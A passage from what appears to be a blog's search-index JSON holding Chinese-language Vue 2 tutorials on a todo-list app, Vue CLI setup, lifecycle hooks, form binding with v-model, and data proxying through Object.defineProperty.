from &#x27;./components/MyList&#x27;  import MyFooter from &#x27;./components/MyFooter.vue&#x27;  export default &#123;    name: &#x27;App&#x27;,    components: &#123; MyHeader, MyList, MyFooter &#125;,    data() &#123;      return &#123;        // 由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）        todos:[          &#123;id:&#x27;001&#x27;,title:&#x27;抽烟&#x27;,done:true&#125;,          &#123;id:&#x27;002&#x27;,title:&#x27;喝酒&#x27;,done:false&#125;,          &#123;id:&#x27;003&#x27;,title:&#x27;开车&#x27;,done:true&#125;        ]      &#125;    &#125;,    methods: &#123;      //添加一个todo      addTodo(todoObj)&#123;        this.todos.unshift(todoObj)      &#125;,      //勾选or取消勾选一个todo      checkTodo(id)&#123;        this.todos.forEach((todo)=&gt;&#123;          if(todo.id === id) todo.done = !todo.done        &#125;)      &#125;,      //删除一个todo      deleteTodo(id)&#123;        this.todos = this.todos.filter( todo =&gt; todo.id !== id )      &#125;,      //全选or取消全选      checkAllTodo(done)&#123;        this.todos.forEach((todo)=&gt;&#123;          todo.done = done        &#125;)      &#125;,      //清除所有已经完成的todo      clearAllTodo()&#123;        this.todos = this.todos.filter((todo)=&gt;&#123;          return !todo.done        &#125;)      &#125;    &#125;  &#125;&lt;/script&gt;&lt;style&gt;  /*base*/  body &#123;background: #fff;&#125;  .btn &#123;display: inline-block;padding: 4px 12px;margin-bottom: 0;font-size: 14px;    line-height: 20px;text-align: center;vertical-align: middle;cursor: pointer;    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);    border-radius: 4px;&#125;  .btn-danger &#123;color: #fff;background-color: #da4f49;border: 1px solid #bd362f;&#125;  .btn-danger:hover &#123;color: #fff;background-color: #bd362f;&#125;  .btn:focus &#123;outline: none;&#125;  .todo-container &#123;width: 600px;margin: 0 auto;&#125;  .todo-container .todo-wrap &#123;padding: 10px;border: 1px solid #ddd;border-radius: 5px;&#125;&lt;/style&gt;\n\nsrc/components/MyHeader.vue\n&lt;template&gt;\t&lt;div class=&quot;todo-header&quot;&gt;\t\t&lt;input type=&quot;text&quot; placeholder=&quot;请输入你的任务名称，按回车键确认&quot;            v-model=&quot;title&quot; @keyup.enter=&quot;add&quot;/&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;nanoid&#125; from &#x27;nanoid&#x27;\texport default &#123;\t\tname:&#x27;MyHeader&#x27;,\t\tprops:[&#x27;addTodo&#x27;],\t// 接收从App传递过来的addTodo\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\ttitle:&#x27;&#x27;\t\t\t\t// 收集用户输入的title\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tadd()&#123;\t\t\t\t// 校验数据\t\t\t\tif(!this.title.trim()) return alert(&#x27;输入不能为空&#x27;)\t\t\t\t// 将用户的输入包装成一个todo对象\t\t\t\tconst todoObj = &#123; id:nanoid(), title:this.title, done:false &#125;\t\t\t\t// 通知App组件去添加一个todo对象\t\t\t\tthis.addTodo(todoObj)\t\t\t\t// 清空输入\t\t\t\tthis.title = &#x27;&#x27;\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;&lt;style scoped&gt;\t/*header*/\t.todo-header input &#123;width: 560px;height: 28px;font-size: 14px;    border: 1px solid #ccc;border-radius: 4px;padding: 4px 7px;&#125;\t.todo-header input:focus &#123;outline: none;border-color: rgba(82, 168, 236, 0.8);\t\tbox-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);&#125;&lt;/style&gt;\n\nsrc/components/MyList.vue\n&lt;template&gt;  &lt;ul class=&quot;todo-main&quot;&gt;    &lt;MyItem v-for=&quot;todoObj in todos&quot;:key=&quot;todoObj.id&quot;             :todo=&quot;todoObj&quot; :checkTodo=&quot;checkTodo&quot;:deleteTodo=&quot;deleteTodo&quot;/&gt;  &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;  import MyItem from &#x27;./MyItem&#x27;  export default &#123;    name:&#x27;MyList&#x27;,    components:&#123;MyItem&#125;,    // 声明接收App传递的数据，其中todos是自己用的，checkTodo和deleteTodo是给子组件MyItem用的    props:[&#x27;todos&#x27;,&#x27;checkTodo&#x27;,&#x27;deleteTodo&#x27;]  &#125;&lt;/script&gt;&lt;style scoped&gt;  /*main*/  .todo-main &#123;margin-left: 0px;border: 1px solid #ddd;border-radius: 2px;padding: 0px;&#125;  .todo-empty &#123;height: 40px;line-height: 40px;border: 1px solid #ddd;    border-radius: 2px;padding-left: 5px;margin-top: 10px;&#125;&lt;/style&gt;\n\nsrc/components/MyItem.vue\n&lt;template&gt;  &lt;li&gt;    &lt;label&gt;      &lt;!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props --&gt;      &lt;!-- &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;/&gt; --&gt;      &lt;input type=&quot;checkbox&quot; :checked=&quot;todo.done&quot; @change=&quot;handleCheck(todo.id)&quot;/&gt;        &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;/span&gt;    &lt;/label&gt;    &lt;button class=&quot;btn btn-danger&quot; @click=&quot;handleDelete(todo.id)&quot;&gt;删除&lt;/button&gt;  &lt;/li&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;MyItem&#x27;,    //声明接收todo、checkTodo、deleteTodo    props:[&#x27;todo&#x27;,&#x27;checkTodo&#x27;,&#x27;deleteTodo&#x27;],    methods: &#123;      // 勾选or取消勾选      handleCheck(id)&#123;        this.checkTodo(id)\t// 通知App组件将对应的todo对象的done值取反      &#125;,      // 删除      handleDelete(id)&#123;        if(confirm(&#x27;确定删除吗？&#x27;))&#123;          this.deleteTodo(id)\t// 通知App组件将对应的todo对象删除        &#125;      &#125;    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;  /*item*/  li &#123;list-style: none;height: 36px;line-height: 36px;padding: 0 5px;    border-bottom: 1px solid #ddd;&#125;  li label &#123;float: left;cursor: pointer;&#125;  li label li input &#123;vertical-align:middle; margin-right:6px; position:relative;top: -1px;&#125;  li button &#123;float: right;display: none;margin-top: 3px;&#125;  li:before &#123;content: initial;&#125;  li:last-child &#123;border-bottom: none;&#125;  li:hover&#123;background-color: #ddd;&#125;  li:hover button&#123;display: block;&#125;&lt;/style&gt;\n\nsrc/components/MyFooter.vue\n&lt;template&gt;  &lt;div class=&quot;todo-footer&quot; v-show=&quot;total&quot;&gt;    &lt;label&gt;      &lt;!-- &lt;input type=&quot;checkbox&quot; :checked=&quot;isAll&quot; @change=&quot;checkAll&quot;/&gt; --&gt;      &lt;input type=&quot;checkbox&quot; v-model=&quot;isAll&quot;/&gt;    &lt;/label&gt;    &lt;span&gt;      &lt;span&gt;已完成&#123;&#123; doneTotal &#125;&#125;&lt;/span&gt; / 全部&#123;&#123; total &#125;&#125;    &lt;/span&gt;    &lt;button class=&quot;btn btn-danger&quot; @click=&quot;clearAll&quot;&gt;清除已完成任务&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;MyFooter&#x27;,    props:[&#x27;todos&#x27;,&#x27;checkAllTodo&#x27;,&#x27;clearAllTodo&#x27;],    computed: &#123;      // 总数      total()&#123;        return this.todos.length      &#125;,      // 已完成数      doneTotal()&#123;        //此处使用reduce方法做条件统计        return this.todos.reduce((pre,todo)=&gt; pre + (todo.done ? 1 : 0) ,0)      &#125;,      // 控制全选框      isAll:&#123;        //全选框是否勾选        get()&#123;          return this.doneTotal === this.total &amp;&amp; this.total &gt; 0        &#125;,        //isAll被修改时set被调用        set(value)&#123;          this.checkAllTodo(value)        &#125;      &#125;    &#125;,    methods: &#123;      /* checkAll(e)&#123;\t\t\t\tthis.checkAllTodo(e.target.checked)\t\t\t&#125; */      //清空所有已完成      clearAll()&#123;        this.clearAllTodo()      &#125;    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;  /*footer*/  .todo-footer &#123;height: 40px;line-height: 40px;padding-left: 6px;margin-top: 5px;&#125;  .todo-footer label &#123;display: inline-block;margin-right: 20px;cursor: pointer;&#125;  .todo-footer label input &#123;position: relative;top: -1px;vertical-align: middle;    margin-right: 5px;&#125;  .todo-footer button &#123;float: right;margin-top: 5px;&#125;&lt;/style&gt;\n\n\n\n\n使用本地存储优化Todo-List本地存储：《JS提升（一）：浏览器本地存储（WebStorage）》\nscr/App.vue\n&lt;template&gt;\t&lt;div id=&quot;root&quot;&gt;\t\t&lt;div class=&quot;todo-container&quot;&gt;\t\t\t&lt;div class=&quot;todo-wrap&quot;&gt;\t\t\t\t&lt;MyHeader :addTodo=&quot;addTodo&quot;/&gt;\t\t\t\t&lt;MyList :todos=&quot;todos&quot; :checkTodo=&quot;checkTodo&quot; :deleteTodo=&quot;deleteTodo&quot;/&gt;\t\t\t\t&lt;MyFooter :todos=&quot;todos&quot; :checkAllTodo=&quot;checkAllTodo&quot; :clearAllTodo=&quot;clearAllTodo&quot;/&gt;\t\t\t&lt;/div&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport MyHeader from &#x27;./components/MyHeader&#x27;\timport MyList from &#x27;./components/MyList&#x27;\timport MyFooter from &#x27;./components/MyFooter.vue&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tcomponents:&#123;MyHeader,MyList,MyFooter&#125;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\t// 🔴从本地存储中获得数据，null就创建空数组[]\t\t\t\ttodos:JSON.parse(localStorage.getItem(&#x27;todos&#x27;)) || []\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\t//添加一个todo\t\t\taddTodo(todoObj)&#123;\t\t\t\tthis.todos.unshift(todoObj)\t\t\t&#125;,\t\t\t//勾选or取消勾选一个todo\t\t\tcheckTodo(id)&#123;\t\t\t\tthis.todos.forEach((todo)=&gt;&#123;\t\t\t\t\tif(todo.id === id) todo.done = !todo.done\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//删除一个todo\t\t\tdeleteTodo(id)&#123;\t\t\t\tthis.todos = this.todos.filter( todo =&gt; todo.id !== id )\t\t\t&#125;,\t\t\t//全选or取消全选\t\t\tcheckAllTodo(done)&#123;\t\t\t\tthis.todos.forEach((todo)=&gt;&#123;\t\t\t\t\ttodo.done = done\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//清除所有已经完成的todo\t\t\tclearAllTodo()&#123;\t\t\t\tthis.todos = this.todos.filter((todo)=&gt;&#123;\t\t\t\t\treturn !todo.done\t\t\t\t&#125;)\t\t\t&#125;\t\t&#125;,    // 🔴数据发生改变就放到本地存储中，注意深度侦听，以及JSON转化为字符串\t\twatch: &#123;\t\t\ttodos:&#123;\t\t\t\tdeep:true, //开启深度监视，可以监视对象中的属性，done改变了它也可以检测出来\t\t\t\thandler(value)&#123;\t\t\t\t\tlocalStorage.setItem(&#x27;todos&#x27;,JSON.stringify(value))\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\n","categories":["Vue"],"tags":["Vue CLI","组件通信","案例"]},{"title":"Vue（十六）：Vue脚手架之初始化","url":"/2022/04/07/Vue%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/","content":"说明\nVue CLI (Command Line Interface)\n\n\nVue脚手架是Vue官方提供的标准化开发工具（开发平台）\n最新的版本是 4.x\n文档 Vue CLI\n\n具体步骤\n如果下载缓慢请配置npm淘宝镜像：npm config set registry http://registry.npm.taobao.org\n全局安装 @vue&#x2F;cli：npm install -g @vue/cli\n切换到创建项目的目录，使用命令创建项目vue create xxx\n选择使用vue的版本\n启动项目npm run serve\n打包项目npm run build\n暂停项目 Ctrl+C\n\n\nVue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，请执行vue inspect &gt; output.js\n\n脚手架文件结构.文件目录├── node_modules ├── public│   ├── favicon.ico: 页签图标│   └── index.html: 主页面├── src│   ├── assets: 存放静态资源│   │   └── logo.png│   │── component: 存放组件│   │   └── HelloWorld.vue│   │── App.vue: 汇总所有组件│   └── main.js: 入口文件├── .gitignore: git版本管制忽略的配置├── babel.config.js: babel的配置文件├── package.json: 应用包配置文件 ├── README.md: 应用描述文件└── package-lock.json: 包版本控制文件\n\nsrc/components/School.vue\n&lt;template&gt;  &lt;div class=&quot;demo&quot;&gt;    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;/h2&gt;    &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name: &quot;School&quot;,    data() &#123;      return &#123;        name: &quot;UESTC&quot;,        address: &quot;成都&quot;,      &#125;;    &#125;,    methods: &#123;showName() &#123;alert(this.name);&#125;,&#125;,  &#125;;&lt;/script&gt;&lt;style&gt;  .demo &#123;background-color: orange;&#125;&lt;/style&gt;\n\nsrc/components/Student.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;学生姓名：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生年龄：&#123;&#123; age &#125;&#125;&lt;/h2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name: &quot;Student&quot;,    data() &#123;      return &#123;        name: &quot;cess&quot;,        age: 18,      &#125;;    &#125;,  &#125;;&lt;/script&gt;\n\nsrc/App.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;img src=&quot;./assets/logo.png&quot; alt=&quot;&quot;&gt;\t\t&lt;School&gt;&lt;/School&gt;\t\t&lt;Student&gt;&lt;/Student&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\t// 引入组件\timport School from &#x27;./components/School.vue&#x27;\timport Student from &#x27;./components/Student.vue&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tcomponents:&#123; School, Student &#125;\t&#125;&lt;/script&gt;\n\nsrc/main.js\n// 该文件是整个项目的入口文件import Vue from &#x27;vue&#x27;\t\t\t\t// 引入Vueimport App from &#x27;./App.vue&#x27;\t// 引入App组件，它是所有组件的父组件Vue.config.productionTip = falsenew Vue(&#123;\tel:&#x27;#app&#x27;,  render: h =&gt; h(App),\t\t\t// render函数完成了这个功能：将App组件放入容器中&#125;)// .$mount(&#x27;#app&#x27;)\n\npublic/index.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;&quot;&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;              &lt;!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 --&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;              &lt;!-- 开启移动端的理想端口 --&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;              &lt;!-- 配置页签图标 &lt;%= BASE_URL %&gt;是public所在路径，使用绝对路径 --&gt;        &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt;              &lt;!-- 配置网页标题 --&gt;        &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;            \t&lt;!-- 当浏览器不支持js时，noscript中的元素就会被渲染 --&gt;      \t&lt;noscript&gt;      \t\t&lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt;    \t\t&lt;/noscript&gt;                  &lt;!-- 容器 --&gt;        &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;\n\n\nrender函数import Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;Vue.config.productionTip = falsenew Vue(&#123;  el:&#x27;#app&#x27;,  // render函数功能：将App组件放入容器中  // 简写形式  render: h =&gt; h(App),  // 完整形式  // render(createElement)&#123;  //   return createElement(App)  // &#125;&#125;)\n\n关于不同版本的Vue\nvue.js与vue.runtime.xxx.js的区别\nvue.js 是完整版的Vue，包含：核心功能+模板解析器\nvue.runtime.xxx.js 是运行版的Vue，只包含核心功能，没有模板解析器esm 就是 ES6 module\n\n\n因为 vue.runtime.xxx.js 没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容\n\nvue.config.js 配置文件\nVue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，请执行vue inspect &gt; output.js\n\n使用vue.config.js可以对脚手架进行个性化定制，和package.json同级目录，详见 配置参考 | Vue CLI\nmodule.exports = &#123;  pages: &#123;    index: &#123;      entry: &#x27;src/index/main.js&#x27; // 入口    &#125;  &#125;,  lineOnSave: false\t// 关闭语法检查&#125;\n\n","categories":["Vue"],"tags":["Vue CLI","脚手架"]},{"title":"Vue（十四）：生命周期","url":"/2022/04/07/Vue%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89%EF%BC%9A%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","content":"引出生命周期\n生命周期\n\n又名生命周期回调函数、生命周期函数、生命周期钩子\n\n是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数\n\n生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的\n\n生命周期函数中的 this 指向是vm或组件实例对象\n\n\n\n\n&lt;title&gt;引出生命周期&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2 v-if=&quot;a&quot;&gt;你好啊&lt;/h2&gt;  &lt;h2 :style=&quot;&#123;opacity&#125;&quot;&gt;看笔记学Vue&lt;/h2&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      a: false,      opacity: 1    &#125;,    methods: &#123;    &#125;,    // 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted    mounted() &#123;      console.log(&#x27;mounted&#x27;, this)      setInterval(() =&gt; &#123;        this.opacity -= 0.01        if(this.opacity &lt;= 0) this.opacity = 1      &#125;, 16)    &#125;,  &#125;)  // 通过外部的定时器实现（不推荐）  // setInterval(() =&gt; &#123;  // \t\tvm.opacity -= 0.01  // \t\tif(vm.opacity &lt;= 0) vm.opacity = 1  // &#125;,16)&lt;/script&gt;\n\n\n分析生命周期\n&lt;title&gt;分析生命周期&lt;/title&gt;\t&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;\t&lt;div id=&quot;root&quot; :x=&quot;n&quot;&gt;\t\t&lt;h2 v-text=&quot;n&quot;&gt;&lt;/h2&gt;\t\t&lt;h2&gt;当前的n值是：&#123;&#123; n &#125;&#125;&lt;/h2&gt;\t\t&lt;button @click=&quot;add&quot;&gt;点我n+1&lt;/button&gt;\t\t&lt;button @click=&quot;bye&quot;&gt;点我销毁vm&lt;/button&gt;\t&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;\tVue.config.productionTip = false\tnew Vue(&#123;\t\tel: &#x27;#root&#x27;,\t\t// template:`\t\t// \t&lt;div&gt;\t\t// \t\t&lt;h2&gt;当前的n值是：&#123;&#123;n&#125;&#125;&lt;/h2&gt;\t\t// \t\t&lt;button @click=&quot;add&quot;&gt;点我n+1&lt;/button&gt;\t\t// \t&lt;/div&gt;\t\t// `,\t\tdata: &#123;\t\t\tn: 1\t\t&#125;,\t\tmethods: &#123;\t\t\tadd() &#123; console.log(&#x27;add&#x27;)\t\t\t\tthis.n++\t\t\t&#125;,\t\t\tbye() &#123;\t\t\t\tconsole.log(&#x27;bye&#x27;)\t\t\t\tthis.$destroy()\t\t\t&#125;\t\t&#125;,\t\twatch: &#123;\t\t\tn() &#123;\t\t\t\tconsole.log(&#x27;n变了&#x27;)\t\t\t&#125;\t\t&#125;,\t\tbeforeCreate() &#123;console.log(&#x27;beforeCreate&#x27;)&#125;,\t\tcreated() &#123;console.log(&#x27;created&#x27;)&#125;,\t\tbeforeMount() &#123;console.log(&#x27;beforeMount&#x27;)&#125;,\t\tmounted() &#123;console.log(&#x27;mounted&#x27;)&#125;,\t\tbeforeUpdate() &#123;console.log(&#x27;beforeUpdate&#x27;)&#125;,\t\tupdated() &#123;console.log(&#x27;updated&#x27;)&#125;,\t\tbeforeDestroy() &#123;console.log(&#x27;beforeDestroy&#x27;)&#125;,\t\tdestroyed() &#123;console.log(&#x27;destroyed&#x27;)&#125;,\t&#125;)&lt;/script&gt;\n\nvm的一生（vm的生命周期）：4对（8个）钩子\n将要创建 &#x3D;&#x3D;&#x3D;》调用beforeCreate函数\n创建完毕 &#x3D;&#x3D;&#x3D;》调用created函数\n\n将要挂载 &#x3D;&#x3D;&#x3D;》调用beforeMount函数【重要】\n挂载完毕 &#x3D;&#x3D;&#x3D;》调用mounted函数\n\n将要更新 &#x3D;&#x3D;&#x3D;》调用beforeUpdate函数\n更新完毕 &#x3D;&#x3D;&#x3D;》调用updated函数\n\n将要销毁 &#x3D;&#x3D;&#x3D;》调用beforeDestroy函数【重要】\n销毁完毕 &#x3D;&#x3D;&#x3D;》调用destroyed函数\n另外3个生命周期钩子nextTick\navtivated和deactivated\n\n\n总结生命周期\n常用的生命周期钩子\nmounted发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作\nbeforeDestroy清除定时器、解绑自定义事件、取消订阅消息等收尾工作\n\n\n关于销毁Vue实例\n销毁后借助Vue开发者工具看不到任何信息\n销毁后自定义事件会失效，但原生DOM事件依然有效\n一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了\n\n\n\n&lt;title&gt;引出生命周期&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2 :style=&quot;&#123;opacity&#125;&quot;&gt;欢迎学习Vue&lt;/h2&gt;  &lt;button @click=&quot;opacity = 1&quot;&gt;透明度设置为1&lt;/button&gt;  &lt;button @click=&quot;stop&quot;&gt;点我停止变换&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      opacity: 1    &#125;,    methods: &#123;      stop() &#123;        this.$destroy()      &#125;    &#125;,    // Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted    mounted() &#123;      console.log(&#x27;mounted&#x27;, this)      this.timer = setInterval(() =&gt; &#123;        console.log(&#x27;setInterval&#x27;)        this.opacity -= 0.01        if (this.opacity &lt;= 0) this.opacity = 1      &#125;, 16)    &#125;,    beforeDestroy() &#123;      clearInterval(this.timer)      console.log(&#x27;vm即将驾鹤西游了&#x27;)    &#125;,  &#125;)&lt;/script&gt;\n\n\n","categories":["Vue"],"tags":["生命周期"]},{"title":"Vue（十）：收集表单数据","url":"/2022/04/06/Vue%EF%BC%88%E5%8D%81%EF%BC%89%EF%BC%9A%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/","content":"收集表单数据&lt;title&gt;收集表单数据&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;form @submit.prevent=&quot;demo&quot;&gt;    账号：&lt;input type=&quot;text&quot; v-model.trim=&quot;userInfo.account&quot;&gt; &lt;br /&gt;&lt;br /&gt;    密码：&lt;input type=&quot;password&quot; v-model=&quot;userInfo.password&quot;&gt; &lt;br /&gt;&lt;br /&gt;    年龄：&lt;input type=&quot;number&quot; v-model.number=&quot;userInfo.age&quot;&gt; &lt;br /&gt;&lt;br /&gt;    性别：    男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; v-model=&quot;userInfo.sex&quot; value=&quot;male&quot;&gt;    女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; v-model=&quot;userInfo.sex&quot; value=&quot;female&quot;&gt; &lt;br /&gt;&lt;br /&gt;    爱好：    学习&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;study&quot;&gt;    打游戏&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;game&quot;&gt;    吃饭&lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.hobby&quot; value=&quot;eat&quot;&gt;    &lt;br /&gt;&lt;br /&gt;    所属校区    &lt;select v-model=&quot;userInfo.city&quot;&gt;      &lt;option value=&quot;&quot;&gt;请选择校区&lt;/option&gt;      &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;      &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt;      &lt;option value=&quot;shenzhen&quot;&gt;深圳&lt;/option&gt;      &lt;option value=&quot;wuhan&quot;&gt;成都&lt;/option&gt;    &lt;/select&gt;    &lt;br/&gt;&lt;br/&gt;    其他信息：    &lt;textarea v-model.lazy=&quot;userInfo.other&quot;&gt;&lt;/textarea&gt; &lt;br/&gt;&lt;br/&gt;    &lt;input type=&quot;checkbox&quot; v-model=&quot;userInfo.agree&quot;&gt;阅读并接受    &lt;a href=&quot;https://www.yuque.com/cessstudy&quot;&gt;《用户协议》&lt;/a&gt;    &lt;button&gt;提交&lt;/button&gt;  &lt;/form&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      userInfo: &#123;        account: &#x27;&#x27;,        password: &#x27;&#x27;,        age: 18,        sex: &#x27;female&#x27;,        hobby: [],        city: &#x27;beijing&#x27;,        other: &#x27;&#x27;,        agree: &#x27;&#x27;      &#125;    &#125;,    methods: &#123;      demo() &#123;        console.log(JSON.stringify(this.userInfo))      &#125;    &#125;  &#125;)&lt;/script&gt;\n\n\n\n若&lt;input type=&quot;text&quot;/&gt;，则v-model收集的是value值，用户输入的内容就是value值\n若&lt;input type=&quot;radio&quot;/&gt;单选框，则v-model收集的是value值，且要给标签配置value属性\n若&lt;input type=&quot;checkbox&quot;/&gt;多选框\n没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）\n配置了value属性\nv-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）\nv-model的初始值是数组，那么收集的就是value组成的数组\n\n\n\n\nv-model的三个修饰符\nlazy 失去焦点后再收集数据\nnumber输入字符串转为有效的数字\ntrim 输入首尾空格过滤\n\n\n\n","categories":["Vue"],"tags":["表单"]},{"title":"Vue（四）：MVVM模型与数据代理","url":"/2022/04/01/Vue%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9AMVVM%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/","content":"MVVM模型\nMVVM模型\nM：模型 Model，data中的数据\nV：视图 View，模板代码\nVM：视图模型 ViewModel，Vue实例（相当于一个链接纽带——\n\n\n观察发现\ndata中所有的属性，最后都出现在了vm身上\nvm身上所有的属性 及Vue原型身上所有的属性，在 Vue模板中都可以直接使用\n\nVue中的数据代理Object.defineproperty方法\nlet number = 18let person = &#123;  name: &#x27;张三&#x27;,  sex: &#x27;男&#x27;,&#125;Object.defineProperty(person, &#x27;age&#x27;, &#123;  // value:18,  // enumerable:true,\t\t// 控制属性是否可以枚举，默认值是false  // writable:true,\t\t\t// 控制属性是否可以被修改，默认值是false  // configurable:true\t// 控制属性是否可以被删除，默认值是false  // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值  get() &#123;    console.log(&#x27;有人读取age属性了&#x27;)    return number  &#125;,  // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值  set(value) &#123;    console.log(&#x27;有人修改了age属性，且值是&#x27;, value)    number = value  &#125;&#125;)// console.log(Object.keys(person))console.log(person)\n\n\n数据代理：通过一个对象代理对另一个对象中属性的操作（读&#x2F;写）\n\nlet obj = &#123; x: 100 &#125;let obj2 = &#123; y: 200 &#125;Object.defineProperty(obj2, &#x27;x&#x27;, &#123;  get() &#123;    return obj.x  &#125;,  set(value) &#123;    obj.x = value  &#125;&#125;)\n\n\nVue中的数据代理通过vm对象来代理data对象中属性的操作（读&#x2F;写）\nVue中数据代理的好处：更加方便的操作data中的数据\n基本原理\n通过object.defineProperty()把data对象中所有属性添加到vm上\n为每一个添加到vm上的属性，都指定一个 getter setter\n在getter setter内部去操作（读&#x2F;写）data中对应的属性\n\n\n\n\n&lt;div id=&quot;root&quot;&gt;    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;/h2&gt;&lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = falseconst vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;        name: &#x27;电子科技大学&#x27;,        address: &#x27;成都&#x27;    